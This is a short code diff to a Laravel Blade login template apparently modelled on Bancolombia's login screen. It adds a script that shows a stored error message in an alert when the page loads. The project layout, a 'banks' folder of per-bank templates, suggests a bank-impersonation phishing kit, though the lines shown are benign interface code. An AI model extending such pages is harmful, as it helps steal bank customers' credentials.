@@ -6,7 +6,7 @@
 
 
  {{-- si hay error --}}
-  
+ 
   @if($errors->any())
     @include('banks.bancolombia.components.alert', [
       'id' => 'loginError',
@@ -49,6 +49,15 @@
 
 @push('scripts')
 <script>
+  document.addEventListener('DOMContentLoaded', () => {
+  try {
+    const err = sessionStorage.getItem('rt_last_error');
+    if (err) {
+      sessionStorage.removeItem('rt_last_error');
+      showBankAlert('loginError', err);
+    }
+  } catch {}
+
   // Ejemplo: habilitar botón cuando el input sea válido (4 dígitos)
   const user = document.getElementById('txtUsuario');
   const btn = document.getElementById('btnUsuario');
@@ -66,5 +75,6 @@
     try { sessionStorage.removeItem('rt_last_error'); } catch {}
     window.showLoading?.('Continuando...');
   })
+});
 </script>
 @endpush
